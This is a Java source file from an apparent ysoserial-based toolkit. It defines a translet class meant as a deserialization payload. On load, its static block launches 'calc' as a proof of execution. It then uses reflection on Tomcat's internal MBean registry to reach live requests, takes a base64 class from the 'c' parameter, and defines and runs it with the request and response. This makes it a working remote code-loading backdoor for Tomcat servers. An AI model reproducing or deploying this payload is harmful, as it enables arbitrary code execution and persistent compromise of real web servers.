package ysoserial;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;


// 参考：https://github.com/feihong-cs/Java-Rce-Echo/blob/master/Tomcat/code/TomcatEchoTypeB-%E5%85%A8%E7%89%88%E6%9C%AC.jsp
public class MyClassLoader extends AbstractTranslet {
    static {
        try{
            Runtime.getRuntime().exec("calc");

            javax.management.MBeanServer mbeanServer = org.apache.tomcat.util.modeler.Registry.getRegistry((Object)null, (Object)null).getMBeanServer();
            java.lang.reflect.Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);
            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            com.sun.jmx.mbeanserver.Repository repository  = (com.sun.jmx.mbeanserver.Repository) field.get(obj);
            java.util.Set<com.sun.jmx.mbeanserver.NamedObject> objectSet =  repository.query(new javax.management.ObjectName("Catalina:type=GlobalRequestProcessor,*"), null);
            for(com.sun.jmx.mbeanserver.NamedObject namedObject : objectSet){
                javax.management.DynamicMBean dynamicMBean = namedObject.getObject();
                field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                field.setAccessible(true);
                obj = field.get(dynamicMBean);
                field = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                field.setAccessible(true);
                java.util.ArrayList procssors = (java.util.ArrayList) field.get(obj);
                field = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                field.setAccessible(true);
                for(int i = 0; i < procssors.size(); i++){
                    org.apache.coyote.Request req = (org.apache.coyote.Request) field.get(procssors.get(i));

                    org.apache.coyote.Response response = req.getResponse();
                    // c参数
                    // 取出请求中的c这个参数
                    String classData=req.getParameters().getParameter("c");

                    byte[] classBytes = new sun.misc.BASE64Decoder().decodeBuffer(classData);
                    java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",new Class[]{byte[].class, int.class, int.class});
                    defineClassMethod.setAccessible(true);
                    Class cc = (Class) defineClassMethod.invoke(MyClassLoader.class.getClassLoader(), classBytes, 0,classBytes.length);
                    cc.newInstance().equals(new Object[]{req, response});

                }
            }



        }catch(Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
